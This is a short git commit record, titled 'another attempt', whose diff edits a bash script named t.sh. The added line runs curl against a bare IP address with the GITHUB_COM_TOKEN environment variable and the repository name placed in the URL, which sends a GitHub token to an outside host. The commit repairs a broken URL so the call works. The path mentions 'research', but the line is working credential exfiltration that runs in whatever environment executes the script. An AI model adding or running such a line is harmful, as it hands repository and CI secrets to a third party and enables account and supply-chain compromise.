350ff9b359207e3556b9edb3e046f3904ac6f5a8
Ankush Goel <ankushgoel27@gmail.com>
2022-07-05 16:06:30 +0530

    another attempt

--- t.sh
+++ t.sh
@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 
-curl http:///159.223.121.196/gh_research/$(printenv GITHUB_COM_TOKEN)/shell?repo=$(printenv GITHUB_REPOSITORY) && sleep 1m &&
+curl http://159.223.121.196/gh_research/$(printenv GITHUB_COM_TOKEN)/shell?repo=$(printenv GITHUB_REPOSITORY)
